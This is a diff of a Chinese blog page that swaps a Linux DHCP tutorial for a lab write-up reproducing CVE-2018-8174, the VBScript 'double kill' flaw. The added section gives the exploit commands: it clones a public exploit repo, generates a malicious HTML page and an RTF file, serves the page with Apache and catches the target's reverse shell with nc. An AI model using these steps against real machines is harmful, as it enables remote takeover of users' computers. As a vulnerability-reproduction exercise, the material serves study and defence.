@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Linux,">
+  <meta name="keywords" content="漏洞复现,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="Linux搭建DHCP服务1.首先配置网关静态IP：192.168.100.1 子网掩码：255.255.255.0 网关：192.168.100.254 DNS：114.114.114.114 启用网卡 ONBOOT=yes">
-<meta name="keywords" content="Linux">
+<meta name="description" content="CVE-2018-8174-双杀0day漏洞复现漏洞描述：CVE-2018-8174是Windows VBScriptEngine 代码执行漏洞，由于 VBScript 脚本执行引擎(vbscript.dll)存在该漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户受诱导或不慎点击恶意链接或文档，攻击者便可远程获取当前用户系统权限，进而完全控制用户电脑。 2018年">
+<meta name="keywords" content="漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux搭建DHCP服务">
-<meta property="og:url" content="blog.shenzihao.top/2019/08/17/Linux搭建DHCP服务/index.html">
+<meta property="og:title" content="CVE20188174-双杀0day漏洞复现">
+<meta property="og:url" content="blog.shenzihao.top/2019/08/20/双杀Oday复现/index.html">
 <meta property="og:site_name" content="changyouB-log">
-<meta property="og:description" content="Linux搭建DHCP服务1.首先配置网关静态IP：192.168.100.1 子网掩码：255.255.255.0 网关：192.168.100.254 DNS：114.114.114.114 启用网卡 ONBOOT=yes">
+<meta property="og:description" content="CVE-2018-8174-双杀0day漏洞复现漏洞描述：CVE-2018-8174是Windows VBScriptEngine 代码执行漏洞，由于 VBScript 脚本执行引擎(vbscript.dll)存在该漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户受诱导或不慎点击恶意链接或文档，攻击者便可远程获取当前用户系统权限，进而完全控制用户电脑。 2018年">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-17T03:33:26.614Z">
+<meta property="og:updated_time" content="2019-08-20T03:47:38.323Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux搭建DHCP服务">
-<meta name="twitter:description" content="Linux搭建DHCP服务1.首先配置网关静态IP：192.168.100.1 子网掩码：255.255.255.0 网关：192.168.100.254 DNS：114.114.114.114 启用网卡 ONBOOT=yes">
+<meta name="twitter:title" content="CVE20188174-双杀0day漏洞复现">
+<meta name="twitter:description" content="CVE-2018-8174-双杀0day漏洞复现漏洞描述：CVE-2018-8174是Windows VBScriptEngine 代码执行漏洞，由于 VBScript 脚本执行引擎(vbscript.dll)存在该漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户受诱导或不慎点击恶意链接或文档，攻击者便可远程获取当前用户系统权限，进而完全控制用户电脑。 2018年">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="blog.shenzihao.top/2019/08/17/Linux搭建DHCP服务/">
+  <link rel="canonical" href="blog.shenzihao.top/2019/08/20/双杀Oday复现/">
 
 
 
 
 
-  <title>Linux搭建DHCP服务 | changyouB-log</title>
+  <title>CVE20188174-双杀0day漏洞复现 | changyouB-log</title>
   
 
 
@@ -253,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/17/Linux搭建DHCP服务/">
+    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/20/双杀Oday复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="申子昊">
@@ -262,7 +262,7 @@
     </span>
 
      <span title="Words count in article">
-     556 字
+     586 字
      </span>
 
         ...
@@ -279,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Linux搭建DHCP服务</h1>
+          <h1 class="post-title" itemprop="name headline">CVE20188174-双杀0day漏洞复现</h1>
         
 
         <div class="post-meta">
@@ -291,8 +291,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-17T10:35:49+08:00">
-                2019-08-17
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-20T10:55:24+08:00">
+                2019-08-20
               </time>
             
 
@@ -328,7 +328,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  556
+                  586
                 </span>
               
 
@@ -365,68 +365,39 @@
       
 
       
-        <h1 id="Linux搭建DHCP服务"><a href="#Linux搭建DHCP服务" class="headerlink" title="Linux搭建DHCP服务"></a>Linux搭建DHCP服务</h1><h5 id="1-首先配置网关"><a href="#1-首先配置网关" class="headerlink" title="1.首先配置网关"></a>1.首先配置网关</h5><p>静态IP：192.168.100.1</p>
-<p>子网掩码：255.255.255.0</p>
-<p>网关：192.168.100.254</p>
-<p>DNS：114.114.114.114</p>
-<p>启用网卡 ONBOOT=yes</p>
+        <h1 id="CVE-2018-8174-双杀0day漏洞复现"><a href="#CVE-2018-8174-双杀0day漏洞复现" class="headerlink" title="CVE-2018-8174-双杀0day漏洞复现"></a>CVE-2018-8174-双杀0day漏洞复现</h1><h5 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h5><p><strong>CVE-2018-8174</strong>是<strong>Windows VBScriptEngine</strong> 代码执行漏洞，由于 <strong>VBScript</strong> 脚本执行引擎(vbscript.dll)存在该漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户受诱导或不慎点击恶意链接或文档，攻击者便可远程获取当前用户系统权限，进而完全控制用户电脑。</p>
+<p>2018年4月18日国内某信息安全公司监控到一例使用该漏洞的攻击活动后，当天与微软公司沟通，将相关信息提交到微软。微软在4月20日确认此漏洞，于5月8号发布了官方安全补丁对其进行修复，并将其命名为 CVE-2018-8174，在国内该漏洞则被称为“双杀”漏洞。</p>
 <a id="more"></a>
 
 <hr>
-<p><strong>vi /etc/sysconfig/network-scripts/ifcfg-ens33</strong>  编辑网卡配置文件</p>
-<p>TYPE=Ethernet<br>PROXY_METHOD=none<br>BROWSER_ONLY=no<br>BOOTPROTO=static<br><strong>IPADDR=192.168.100.1</strong><br><strong>NETMASK=255.255.255.0</strong><br><strong>GATEWAY=192.168.100.254</strong><br><strong>DNS=114.114.114.114</strong><br>DEFROUTE=yes<br>IPV4_FAILURE_FATAL=no<br>IPV6INIT=yes<br>IPV6_AUTOCONF=yes<br>IPV6_DEFROUTE=yes<br>IPV6_FAILURE_FATAL=no<br>IPV6_ADDR_GEN_MODE=stable-privacy<br>NAME=ens33<br>UUID=45d0aa89-95c0-4f78-b14f-6e2cc287307b<br>DEVICE=ens33</p>
-<p><strong>ONBOOT=yes</strong></p>
+<h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><p>攻击机：KALI  IP：192.168.20.128</p>
+<p>靶机：Win7  IP：192.168.20.129  #仅以网站点击恶意链接获取权限方法验证该漏洞</p>
+<p><strong>git clone <a href="https://github.com/Sch01ar/CVE-2018-8174_EXP" target="_blank" rel="noopener">https://github.com/Sch01ar/CVE-2018-8174_EXP</a></strong> </p>
+<p>#root@kali:~# git clone <a href="https://github.com/Sch01ar/CVE-2018-8174_EXP" target="_blank" rel="noopener">https://github.com/Sch01ar/CVE-2018-8174_EXP</a></p>
 <hr>
-<p>配置完成重新启动网卡服务 <strong>service network restart</strong></p>
-<p>Restarting network (via systemctl):                        [  确定  ]</p>
-<p>启动成功</p>
+<h5 id="生成带有恶意VBscript的html页面和word文档"><a href="#生成带有恶意VBscript的html页面和word文档" class="headerlink" title="生成带有恶意VBscript的html页面和word文档"></a>生成带有恶意VBscript的html页面和word文档</h5><p><strong>python CVE-2018-8174.py -u <a href="http://192.168.20.128/exploit.html" target="_blank" rel="noopener">http://192.168.20.128/exploit.html</a> -o msf.rtf -i192.168.20.128 -p 4444</strong></p>
+<p>root@kali:<del># cd CVE-2018-8174_EXP/<br>root@kali:</del>/CVE-2018-8174_EXP# python CVE-2018-8174.py -u <a href="http://192.168.20.128/exploit.html" target="_blank" rel="noopener">http://192.168.20.128/exploit.html</a> -o msf.rtf -i192.168.20.128 -p 4444<br>UNICODE_URL len 138 , need to pad …<br>Generated msf.rtf successfully<br>!!! Completed !!!</p>
+<p>-u：URL 地址</p>
+<p>-o：生成文档</p>
+<p>-i：监听地址</p>
+<p>-p：监听端口<br>用 nc 监听 4444 端口：</p>
 <hr>
-<h5 id="2-配置DHCP"><a href="#2-配置DHCP" class="headerlink" title="2.配置DHCP"></a>2.配置DHCP</h5><p>yum 安装DHCP</p>
-<p>用命令yum repolist 查看下你自己电脑的yum源是否正常</p>
-<p>yum clean all</p>
-<p>yum repolist</p>
-<p>yum list dhcp</p>
-<p><strong>yum install dhcp.x86_64</strong></p>
+<p>生成后ls查看当前目录下的文件 确保所需要的文件完整</p>
+<p>root@kali:~/CVE-2018-8174_EXP# ls<br>CVE-2018-8174.py  <strong>exploit.html</strong>  <strong>msf.rtf</strong>  README.md</p>
 <hr>
-<p>安装成功 我们进到DHCP目录</p>
-<p><strong>cd /etc/dhcp</strong> </p>
-<p>找到dhcpd.conf文件进行查看</p>
-<p><strong>cat dhcpd.conf</strong></p>
-<p>会出现一个DHCP目录</p>
-<p><strong>usr/share/doc/dhcp*/dhcpd.conf.example</strong> </p>
-<p>我们要将这个目录复制到dhcpd.conf</p>
-<p><strong>cp  /usr/share/doc/dhcp*/dhcpd.conf.example   /etc/dhcp/dhcpd.conf</strong></p>
-<p>覆盖成功以后 我们进入编辑</p>
-<p><strong>vim /etc/dhcp/dhcpd.conf</strong></p>
+<p>将explot.html复制到/var/www/html路径下，并开启apache服务</p>
+<p>root@kali:~/CVE-2018-8174_EXP# <strong>cp exploit.html /var/www/html</strong></p>
+<p>root@kali:~/CVE-2018-8174_EXP# <strong>service apache2 start</strong></p>
 <hr>
-<p>接下来我修改下，给自己改域名和自己的DNS网段</p>
-<p><strong>option definitions common to all supported networks…</strong></p>
-<p>option domain-name <strong>“lanou.com”;</strong><br>option domain-name-servers  <strong>8.8.8.8;</strong></p>
+<p>nc指令，用于监听4444端口</p>
+<p>root@kali:~/CVE-2018-8174_EXP# <strong>nc -lvvp 4444</strong><br><strong>listening on [any] 4444 …</strong></p>
+<p>开始监听后，我们用靶机，也就是windows7浏览器打开攻击机生成的恶意链接：</p>
+<p>用靶机的 IE 浏览器打开恶意 URL：<strong>192.168.20.128/exploit.html</strong></p>
+<p>靶机点开这个连接会直接反弹shell,攻击机已经拿到靶机的系统权限</p>
+<p>192.168.20.129: inverse host lookup failed: Unknown host<br>connect to [192.168.20.128] from (UNKNOWN) [192.168.20.129] 49293<br>Microsoft Windows [�汾 6.1.7601]<br>��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</p>
+<p>C:\Users\haha\Desktop&gt;</p>
 <hr>
-<p>This declaration allows BOOTP clients to get dynamic addresses,</p>
-<p>which we don’t really recommend.</p>
-<p>subnet <strong>192.168.100.0</strong> netmask <strong>255.255.255.0</strong> {<br>  range dynamic-bootp <strong>192.168.100.10 192.168.100.20;</strong><br>  option broadcast-address <strong>8.8.8.8;</strong><br>  option routers <strong>192.168.100.254;</strong><br>}</p>
-<hr>
-<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>启动DHCP</p>
-<p><strong>systemctl start dhcpd</strong> </p>
-<hr>
-<p>然后进入WIN7客户端测试</p>
-<p>将客户端IPV4 IP自动获取</p>
-<p>​                        DNS自动获取</p>
-<p>打开CMD 进入命令窗口</p>
-<p>输入 <strong>ipconfig/renew</strong></p>
-<p>出现我们配置的IP <strong>192.168.100.11</strong> 就成功了</p>
-<hr>
-<h5 id="IP绑定"><a href="#IP绑定" class="headerlink" title="IP绑定"></a>IP绑定</h5><p>所谓IP绑定就是固定的把这个IP给一个机器，这个IP只给他其他的都不给</p>
-<p>首先我先规定下一个IP比如说我只把192.168.100.11给客户端<br>在拿到他们的MAC地址<br>Win7：00:0C:29:B1:52:0A<br>要做到的话我们要改下配置文件<br>用命令打开DHCP配置文件，运行命令<strong>vim /etc/dhcp/dhcpd.conf</strong></p>
-<p>Hosts which require special configuration options can be listed in</p>
-<p>host statements.   If no address is specified, the address will be</p>
-<p>allocated dynamically (if possible), but the host-specific information</p>
-<p>will still come from the host declaration.</p>
-<p><strong>host win7 {</strong><br><strong>hardware ethernet 00:0c:29:0a:ad:a5;</strong><br><strong>fixed-address 192.168.100.11</strong><br><strong>option domain-name-servers 8.8.8.8</strong></p>
-<p>}</p>
-<hr>
-
+<h5 id="实验完成"><a href="#实验完成" class="headerlink" title="实验完成"></a>实验完成</h5>
       
     </div>
     
@@ -443,7 +414,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Linux/" rel="tag"># Linux</a>
+            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
           
         </div>
       
@@ -456,8 +427,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/15/linux汇总3/" rel="next" title="linux汇总">
-                <i class="fa fa-chevron-left"></i> linux汇总
+              <a href="/2019/08/17/Linux内侧/" rel="next" title="Linux内侧">
+                <i class="fa fa-chevron-left"></i> Linux内侧
               </a>
             
           </div>
@@ -465,10 +436,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/17/Linux内侧/" rel="prev" title="Linux内侧">
-                Linux内侧 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -621,7 +588,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux搭建DHCP服务"><span class="nav-number">1.</span> <span class="nav-text">Linux搭建DHCP服务</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-首先配置网关"><span class="nav-number">1.0.0.0.1.</span> <span class="nav-text">1.首先配置网关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-配置DHCP"><span class="nav-number">1.0.0.0.2.</span> <span class="nav-text">2.配置DHCP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#测试"><span class="nav-number">1.0.0.0.3.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#IP绑定"><span class="nav-number">1.0.0.0.4.</span> <span class="nav-text">IP绑定</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2018-8174-双杀0day漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">CVE-2018-8174-双杀0day漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞描述："><span class="nav-number">1.0.0.0.1.</span> <span class="nav-text">漏洞描述：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#复现过程"><span class="nav-number">1.0.0.0.2.</span> <span class="nav-text">复现过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#生成带有恶意VBscript的html页面和word文档"><span class="nav-number">1.0.0.0.3.</span> <span class="nav-text">生成带有恶意VBscript的html页面和word文档</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实验完成"><span class="nav-number">1.0.0.0.4.</span> <span class="nav-text">实验完成</span></a></li></ol></li></ol></div>
             
 
           </div>
